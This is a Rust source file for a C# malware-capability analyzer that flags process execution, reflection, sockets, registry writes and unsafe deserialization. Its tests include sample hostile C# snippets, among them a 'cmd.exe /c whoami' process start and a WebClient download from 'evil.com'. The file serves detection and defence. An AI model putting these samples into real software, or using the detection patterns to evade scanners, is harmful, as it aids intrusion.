//! C# source code analyzer.
//!
//! Analyzes C# source files for suspicious patterns and capabilities.

use crate::analyzers::Analyzer;
use crate::analyzers::{
    comment_metrics::{self, CommentStyle},
    function_metrics::{self, FunctionInfo},
    identifier_metrics, string_metrics, symbol_extraction, text_metrics,
};
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// C# analyzer using tree-sitter
pub struct CSharpAnalyzer {
    parser: RefCell<Parser>,
}

impl Default for CSharpAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl CSharpAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_c_sharp::LANGUAGE.into())
            .expect("Failed to load C# grammar");

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse C# source")?;

        let root = tree.root_node();

        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "csharp".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        report.structure.push(StructuralFeature {
            id: "source/language/csharp".to_string(),
            desc: "C# source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-c-sharp".to_string(),
                value: "csharp".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        self.detect_capabilities(&root, content.as_bytes(), &mut report);
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Extract method calls as symbols for symbol-based rule matching
        symbol_extraction::extract_symbols(
            content,
            tree_sitter_c_sharp::LANGUAGE.into(),
            &["invocation_expression"],
            &mut report,
        );

        crate::path_mapper::analyze_and_link_paths(&mut report);
        crate::env_mapper::analyze_and_link_env_vars(&mut report);

        // Compute metrics for ML analysis
        let metrics = self.compute_metrics(&root, content);
        report.metrics = Some(metrics);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-c-sharp".to_string()];

        Ok(report)
    }

    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        let text = text_metrics::analyze_text(content);

        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let strings = self.extract_string_literals(root, source);
        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, CommentStyle::CStyle);

        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            ..Default::default()
        }
    }

    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_identifiers(&mut cursor, source, &mut identifiers);
        identifiers
    }

    fn walk_for_identifiers(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        identifiers: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();
            if node.kind() == "identifier" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_string_literals(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, &mut strings);
        strings
    }

    fn walk_for_strings(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        strings: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();
            if node.kind() == "string_literal" || node.kind() == "verbatim_string_literal" {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches("@\"")
                        .trim_end_matches('"');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        depth: u32,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        let mut depth = depth;
        loop {
            let node = cursor.node();
            let kind = node.kind();

            let is_function_node = kind == "method_declaration"
                || kind == "constructor_declaration"
                || kind == "local_function_statement";

            if is_function_node {
                let mut info = FunctionInfo::default();
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(name) = name_node.utf8_text(source) {
                        info.name = name.to_string();
                    }
                }
                // Check for async
                if let Ok(text) = node.utf8_text(source) {
                    info.is_async = text.contains("async ");
                }
                // Get parameters
                if let Some(params_node) = node.child_by_field_name("parameters") {
                    let mut param_cursor = params_node.walk();
                    if param_cursor.goto_first_child() {
                        loop {
                            let param = param_cursor.node();
                            if param.kind() == "parameter" {
                                info.param_count += 1;
                                if let Some(name_node) = param.child_by_field_name("name") {
                                    if let Ok(name) = name_node.utf8_text(source) {
                                        info.param_names.push(name.to_string());
                                    }
                                }
                            }
                            if !param_cursor.goto_next_sibling() {
                                break;
                            }
                        }
                    }
                }
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                if is_function_node {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent_kind = cursor.node().kind();
                if parent_kind == "method_declaration"
                    || parent_kind == "constructor_declaration"
                    || parent_kind == "local_function_statement"
                {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            match node.kind() {
                "invocation_expression" => {
                    self.analyze_invocation(&node, source, report);
                }
                "object_creation_expression" => {
                    self.analyze_object_creation(&node, source, report);
                }
                "using_directive" => {
                    self.analyze_using(&node, source, report);
                }
                "attribute" => {
                    self.analyze_attribute(&node, source, report);
                }
                _ => {}
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn analyze_invocation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");
        let mut capabilities: Vec<(&str, &str, &str, f32, Criticality)> = Vec::new();

        // Process execution
        if text.contains("Process.Start") {
            capabilities.push((
                "exec/command/process",
                "Process execution",
                "Process.Start",
                0.95,
                Criticality::Suspicious,
            ));
        }
        if text.contains("ProcessStartInfo") {
            capabilities.push((
                "exec/command/process",
                "Process start configuration",
                "ProcessStartInfo",
                0.85,
                Criticality::Notable,
            ));
        }

        // Reflection (common in malware)
        if text.contains("Assembly.Load") || text.contains("Assembly.LoadFrom") {
            capabilities.push((
                "exec/reflection/assembly-load",
                "Runtime assembly loading",
                "Assembly.Load",
                0.95,
                Criticality::Suspicious,
            ));
        }
        if text.contains("Assembly.LoadFile") {
            capabilities.push((
                "exec/reflection/assembly-load",
                "Assembly loaded from file",
                "Assembly.LoadFile",
                0.95,
                Criticality::Suspicious,
            ));
        }
        if text.contains("Activator.CreateInstance") {
            capabilities.push((
                "exec/reflection/create-instance",
                "Dynamic object creation",
                "Activator.CreateInstance",
                0.9,
                Criticality::Suspicious,
            ));
        }
        if text.contains(".Invoke(") && text.contains("Method") {
            capabilities.push((
                "exec/reflection/invoke",
                "Reflective method invocation",
                "Method.Invoke",
                0.95,
                Criticality::Suspicious,
            ));
        }
        if text.contains("GetMethod") || text.contains("GetType") {
            capabilities.push((
                "anti-analysis/reflection",
                "Reflection API usage",
                "GetMethod/GetType",
                0.75,
                Criticality::Notable,
            ));
        }

        // P/Invoke (native code execution)
        if text.contains("Marshal.") {
            capabilities.push((
                "exec/pinvoke/marshal",
                "Marshal operations",
                "Marshal",
                0.8,
                Criticality::Notable,
            ));
        }

        // File operations
        if text.contains("File.ReadAllText")
            || text.contains("File.ReadAllBytes")
            || text.contains("File.OpenRead")
        {
            capabilities.push((
                "fs/read",
                "File read operation",
                "File.Read",
                0.75,
                Criticality::Inert,
            ));
        }
        if text.contains("File.WriteAllText")
            || text.contains("File.WriteAllBytes")
            || text.contains("File.Create")
        {
            capabilities.push((
                "fs/write",
                "File write operation",
                "File.Write",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("File.Delete") || text.contains("Directory.Delete") {
            capabilities.push((
                "fs/delete",
                "File/directory deletion",
                "File.Delete",
                0.85,
                Criticality::Notable,
            ));
        }
        if text.contains("File.Copy") || text.contains("File.Move") {
            capabilities.push((
                "fs/modify",
                "File copy/move",
                "File.Copy/Move",
                0.75,
                Criticality::Notable,
            ));
        }

        // Network operations
        if text.contains("WebClient") && text.contains("Download") {
            capabilities.push((
                "net/http/download",
                "Web download",
                "WebClient.Download",
                0.9,
                Criticality::Suspicious,
            ));
        }
        if text.contains("HttpClient") && (text.contains("GetAsync") || text.contains("PostAsync"))
        {
            capabilities.push((
                "net/http/client",
                "HTTP client request",
                "HttpClient",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("TcpClient") || text.contains("Socket") {
            capabilities.push((
                "net/socket/create",
                "Socket creation",
                "TcpClient/Socket",
                0.85,
                Criticality::Suspicious,
            ));
        }
        if text.contains("TcpListener") {
            capabilities.push((
                "net/socket/listen",
                "TCP listener",
                "TcpListener",
                0.9,
                Criticality::Suspicious,
            ));
        }

        // Registry (Windows persistence)
        if text.contains("Registry.") || text.contains("RegistryKey") {
            capabilities.push((
                "registry/access",
                "Registry access",
                "Registry",
                0.85,
                Criticality::Notable,
            ));
        }
        if text.contains("SetValue") && text.contains("Registry") {
            capabilities.push((
                "registry/write",
                "Registry write",
                "Registry.SetValue",
                0.9,
                Criticality::Suspicious,
            ));
        }

        // Cryptography
        if text.contains("Aes.") || text.contains("RijndaelManaged") {
            capabilities.push((
                "crypto/encrypt/aes",
                "AES encryption",
                "Aes",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("RSA") || text.contains("RSACryptoServiceProvider") {
            capabilities.push((
                "crypto/encrypt/rsa",
                "RSA encryption",
                "RSA",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("MD5.") || text.contains("SHA1.") || text.contains("SHA256.") {
            capabilities.push((
                "crypto/hash",
                "Hashing operation",
                "MD5/SHA",
                0.7,
                Criticality::Inert,
            ));
        }

        // Serialization (potential deserialization vulnerabilities)
        if text.contains("BinaryFormatter") {
            capabilities.push((
                "anti-analysis/deserialization",
                "Binary deserialization (dangerous)",
                "BinaryFormatter",
                0.95,
                Criticality::Hostile,
            ));
        }
        if text.contains("XmlSerializer") {
            capabilities.push((
                "data/xml-serialize",
                "XML serialization",
                "XmlSerializer",
                0.7,
                Criticality::Notable,
            ));
        }
        if text.contains("JsonConvert") || text.contains("JsonSerializer") {
            capabilities.push((
                "data/json-serialize",
                "JSON serialization",
                "JsonSerializer",
                0.6,
                Criticality::Inert,
            ));
        }

        // Base64 (common obfuscation)
        if text.contains("Convert.FromBase64String") || text.contains("Convert.ToBase64String") {
            capabilities.push((
                "anti-analysis/obfuscation/base64",
                "Base64 encoding/decoding",
                "Base64",
                0.7,
                Criticality::Notable,
            ));
        }

        // Compression (potentially packed payloads)
        if text.contains("GZipStream") || text.contains("DeflateStream") {
            capabilities.push((
                "data/compression",
                "Compression operations",
                "GZipStream",
                0.7,
                Criticality::Notable,
            ));
        }

        // Environment
        if text.contains("Environment.GetEnvironmentVariable") {
            capabilities.push((
                "env/read",
                "Environment variable read",
                "GetEnvironmentVariable",
                0.7,
                Criticality::Inert,
            ));
        }

        for (cap_id, desc, method, conf, criticality) in capabilities {
            report.findings.push(Finding {
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: cap_id.to_string(),
                desc: desc.to_string(),
                conf,
                crit: criticality,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-c-sharp".to_string(),
                    value: method.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
            });
        }
    }

    fn analyze_object_creation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");
        let mut capabilities: Vec<(&str, &str, &str, f32, Criticality)> = Vec::new();

        if text.contains("WebClient") {
            capabilities.push((
                "net/http/client",
                "WebClient instantiation",
                "WebClient",
                0.85,
                Criticality::Notable,
            ));
        }
        if text.contains("HttpClient") {
            capabilities.push((
                "net/http/client",
                "HttpClient instantiation",
                "HttpClient",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("ProcessStartInfo") {
            capabilities.push((
                "exec/command/process",
                "ProcessStartInfo creation",
                "ProcessStartInfo",
                0.85,
                Criticality::Notable,
            ));
        }
        if text.contains("Thread") || text.contains("Task") {
            capabilities.push((
                "process/thread",
                "Thread/Task creation",
                "Thread/Task",
                0.7,
                Criticality::Inert,
            ));
        }
        if text.contains("BinaryFormatter") {
            capabilities.push((
                "anti-analysis/deserialization",
                "Binary deserialization (dangerous)",
                "BinaryFormatter",
                0.95,
                Criticality::Hostile,
            ));
        }

        for (cap_id, desc, method, conf, criticality) in capabilities {
            report.findings.push(Finding {
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: cap_id.to_string(),
                desc: desc.to_string(),
                conf,
                crit: criticality,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-c-sharp".to_string(),
                    value: method.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
            });
        }
    }

    fn analyze_using(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let text = node.utf8_text(source).unwrap_or("");
        let mut capabilities: Vec<(&str, &str, &str, f32, Criticality)> = Vec::new();

        if text.contains("System.Net") {
            capabilities.push((
                "net/import",
                "Network namespace import",
                "System.Net",
                0.7,
                Criticality::Notable,
            ));
        }
        if text.contains("System.Reflection") {
            capabilities.push((
                "anti-analysis/reflection/import",
                "Reflection namespace import",
                "System.Reflection",
                0.75,
                Criticality::Notable,
            ));
        }
        if text.contains("System.Diagnostics") {
            capabilities.push((
                "exec/diagnostics/import",
                "Diagnostics namespace import",
                "System.Diagnostics",
                0.7,
                Criticality::Notable,
            ));
        }
        if text.contains("System.Runtime.InteropServices") {
            capabilities.push((
                "exec/pinvoke/import",
                "P/Invoke namespace import",
                "InteropServices",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("Microsoft.Win32") {
            capabilities.push((
                "registry/import",
                "Registry namespace import",
                "Microsoft.Win32",
                0.75,
                Criticality::Notable,
            ));
        }

        for (cap_id, desc, method, conf, criticality) in capabilities {
            report.findings.push(Finding {
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: cap_id.to_string(),
                desc: desc.to_string(),
                conf,
                crit: criticality,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "import".to_string(),
                    source: "tree-sitter-c-sharp".to_string(),
                    value: method.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
            });
        }
    }

    fn analyze_attribute(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");

        // DllImport (P/Invoke)
        if text.contains("DllImport") {
            report.findings.push(Finding {
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: "exec/pinvoke".to_string(),
                desc: "P/Invoke native function import".to_string(),
                conf: 0.9,
                crit: Criticality::Suspicious,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "attribute".to_string(),
                    source: "tree-sitter-c-sharp".to_string(),
                    value: text.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
            });
        }
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            if node.kind() == "method_declaration" {
                let name = self
                    .extract_function_name(&node, source)
                    .unwrap_or_else(|| "anonymous".to_string());

                report.functions.push(Function {
                    name,
                    offset: Some(format!("0x{:x}", node.start_byte())),
                    size: Some((node.end_byte() - node.start_byte()) as u64),
                    complexity: None,
                    calls: Vec::new(),
                    source: "tree-sitter-c-sharp".to_string(),
                    control_flow: None,
                    instruction_analysis: None,
                    register_usage: None,
                    constants: Vec::new(),
                    properties: None,
                    signature: None,
                    nesting: None,
                    call_patterns: None,
                });
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for CSharpAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes = fs::read(file_path).context("Failed to read C# file")?;
        let content = String::from_utf8_lossy(&bytes);
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("cs")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_cs_code(code: &str) -> AnalysisReport {
        let analyzer = CSharpAnalyzer::new();
        let path = PathBuf::from("test.cs");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
using System;
class Test {
    static void Main() {
        Console.WriteLine("Hello");
    }
}
"#;
        let report = analyze_cs_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/csharp"));
    }

    #[test]
    fn test_detect_process_start() {
        let code = r#"
using System.Diagnostics;
class Test {
    void Run() {
        Process.Start("cmd.exe", "/c whoami");
    }
}
"#;
        let report = analyze_cs_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "exec/command/process"));
    }

    #[test]
    fn test_detect_assembly_load() {
        let code = r#"
using System.Reflection;
class Test {
    void Load() {
        Assembly.Load(bytes);
    }
}
"#;
        let report = analyze_cs_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "exec/reflection/assembly-load"));
    }

    #[test]
    fn test_detect_webclient() {
        let code = r#"
using System.Net;
class Test {
    void Download() {
        var client = new WebClient();
        client.DownloadString("http://evil.com");
    }
}
"#;
        let report = analyze_cs_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "net/http/client" || c.id == "net/http/download"));
    }

    #[test]
    fn test_detect_binary_formatter() {
        let code = r#"
using System.Runtime.Serialization.Formatters.Binary;
class Test {
    void Deserialize() {
        var formatter = new BinaryFormatter();
        formatter.Deserialize(stream);
    }
}
"#;
        let report = analyze_cs_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_dllimport() {
        let code = r#"
using System.Runtime.InteropServices;
class Test {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"#;
        let report = analyze_cs_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/pinvoke"));
    }
}
